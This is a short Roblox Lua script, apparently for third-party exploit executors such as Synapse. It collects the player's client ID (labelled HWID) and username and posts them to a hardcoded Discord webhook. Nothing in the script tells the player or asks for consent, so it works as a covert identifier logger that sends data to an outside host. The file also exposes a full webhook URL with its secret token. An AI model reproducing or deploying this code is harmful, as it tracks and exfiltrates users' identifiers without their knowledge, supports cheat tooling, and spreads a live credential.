local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

request = http_request or request or HttpPost or syn.request

local Webhook = "https://discord.com/api/webhooks/1051905656241803447/2jEy9w0RhFz7vJM7Va__i24fuJlHGhgdZhtN-kboJEuplF7QbEvg3zmMxF_tm5afAUXG"
    local msg = {
        ["username"] = "HWID",
        ["embeds"] = {
            {
                ["color"] = tonumber(tostring("0x" .. "0xff0000")),
                ["title"] = "*" .. "HWID" .. "*",
                ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
            },
            ["fields"] = {
            {
                ["name"] = "HWID-KEY",
                ["value"] = hwid,
                ["inline"] = true
                },
            {
                ["name"] = "Player",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = true
                },
            }
        }
    }
}
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
